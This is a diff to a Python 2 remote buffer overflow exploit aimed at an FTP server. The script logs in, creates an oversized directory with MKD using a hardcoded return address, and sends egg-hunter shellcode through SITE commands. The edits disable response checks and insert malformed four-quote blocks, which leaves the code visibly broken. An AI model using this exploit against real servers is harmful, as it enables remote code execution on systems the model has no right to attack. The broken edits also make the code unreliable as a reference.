@@ -117,8 +117,8 @@ def drop_shellcode(sock, shellcode, egg):
     encoded_shellcode = shellcode.replace("\xff", "\xff\xff")
     i = 0
     while i < 5:
-        sock.send("SITE " + egg + encoded_shellcode)
-        data = sock.recv(1024)
+        data = sock.send("SITE " + egg + encoded_shellcode)
+        #data = sock.recv(1024)
         print data
         i = i+1
 
@@ -163,6 +163,7 @@ def main():
         sock.settimeout(30)
         sock.connect((ip,port))
         print "[+] Connected! Waiting for welcome banner..."
+        
         data = sock.recv(1024)
         if data:
             print data
@@ -175,17 +176,21 @@ def main():
     
     #Attempt logon to FTP server
     print "[+] Attemping FTP Logon with creds: %s / %s" %(ftp_user, ftp_pass)
-    sock.send("USER %s" % ftp_user)
+    data = sock.send("USER %s" % ftp_user)
     print "[+] Sent: USER %s" % ftp_user
-    data = sock.recv(1024)
+    
+    #data = sock.recv(1024)
     print data
+    """"
     if not str(data).startswith("331"):
         print "[!] Unexpected response from FTP Server.  Exiting..."
         sys.exit(-1)
-    sock.send("PASS %s" % ftp_pass)
+    """"
+    data = sock.send("PASS %s" % ftp_pass)
     print "[+] Sent: PASS %s" % ftp_pass
     data = sock.recv(1024)
     print data
+    """"
     if str(data).startswith("230"):
         print "[+] Successfully logged in with creds: %s / %s" %(ftp_user,ftp_pass)
     elif str(data).startswith("530"):
@@ -194,7 +199,7 @@ def main():
     else:
         print "[!] Unexpected response from FTP Server.  Exiting..."
         sys.exit(-1)
-    
+    """"
     ret = pack('<i', 0x77e42ed8)
     print "[+] Using return address of %s" % string2hex(ret)
     patch = pack('<i', 0x7ffd7ffd)
@@ -209,9 +214,10 @@ def main():
     
     #send overflow directory buffer
     print "[+] Creating long directory..."
-    sock.send("MKD "+ d_buffer)
-    data = sock.recv(1024)
+    data = sock.send("MKD "+ d_buffer)
+    #data = sock.recv(1024)
     print data
+    """"
     if str(data).startswith("257"):
         print "[+] Directory Successfuly Created!"
     else:
@@ -220,6 +226,7 @@ def main():
         print "[!] You should retry the exploit with different credentials if they are available."
         print "[!] Exiting..."
         sys.exit(-1)
+    """"
     #start TCP server for FTP server to connect to
     srv = create_tcp_server()
     #get info for PORT address
